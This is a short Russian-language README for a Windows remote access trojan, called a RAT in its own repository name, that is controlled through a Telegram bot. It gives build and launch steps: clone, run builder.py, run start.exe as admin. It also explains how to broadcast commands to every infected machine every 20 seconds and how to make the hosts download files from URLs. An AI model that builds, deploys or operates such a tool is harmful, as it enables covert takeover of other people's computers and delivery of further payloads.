# Удаленное управление через сервис windows и telegram

<!-- Run Locally -->
### :running: Запуск локально

Клонируем репозиторий

```bash
  git clone https://github.com/xartd0/Windows-RAT-Telegram-Service
```

Заходим в его папку

```bash
  cd Windows-RAT-Telegram-Service
```

Билдим лоадер и сам сервис

```bash
  python builder.py
```

Запускаем start.exe (от им.админа) в папке output

```bash
  start.exe
```

Чтобы лоадер создал сервис, оба файла должнры быть в одной папке.

### :eyes: Использование

В боте вы сможете устанавливать задание для всех ботов сразу через /task. 
Например: /task echo %USERNAME%

Задание будет выполняться каждые 20 секунд, чтобы удалить задание /task skip

Есть сторонние команды для подгрузки файлов.
Например /task download_by_url https://i.pinimg.com/originals/23/66/0d/23660defa9c0eb637fdd109fbaaf9487.gif
